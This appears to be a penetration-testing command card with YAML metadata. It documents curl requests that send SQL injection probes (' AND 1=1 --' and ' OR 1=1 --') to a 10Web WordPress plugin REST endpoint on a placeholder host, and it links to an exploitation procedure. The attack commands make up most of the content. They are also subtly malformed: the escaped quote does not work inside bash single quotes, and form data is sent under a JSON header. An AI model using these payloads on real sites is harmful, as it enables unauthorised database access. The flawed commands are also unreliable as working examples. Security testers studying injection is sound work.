---
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d
  'param=\' AND 1=1 --' -H 'Content-Type: application/json'
tags:
  - sqli
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.400Z'
id: 88dec1dc-16cf-4c69-a1a9-eafab0cddbb8
verified: false
validated: true
submitted: true
---
# test-sqli-payload

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' AND 1=1 --' -H 'Content-Type: application/json'
```

## Description

This command tests for SQL injection by sending a conditional payload to the API endpoint, checking if the response differs based on the injection success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d 'param=...'` | Payload data for injection | Yes |
| `-H 'Content-Type: ...'` | Sets JSON header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' AND 1=1 --' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' OR 1=1 --' -v -H 'Content-Type: application/json'
```

## Expected Output

JSON response indicating successful query execution, e.g., {"status":"ok"} without SQL errors.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-TenWeb-API-Endpoint]]
